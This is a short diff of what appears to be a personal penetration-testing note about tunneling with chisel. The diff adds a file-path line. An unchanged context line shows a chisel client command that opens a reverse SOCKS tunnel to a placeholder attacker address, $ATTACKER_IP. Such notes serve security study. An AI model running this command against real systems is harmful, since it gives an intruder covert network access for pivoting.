@@ -3,6 +3,8 @@
 ./chisel client $ATTACKER_IP:443 R:socks
 ```
 
+` zet/20221003150602/README.md `
+
 # Related
 
 - [20221003150604](/zet/20221003150604/README.md) tunneling through chisel - socks
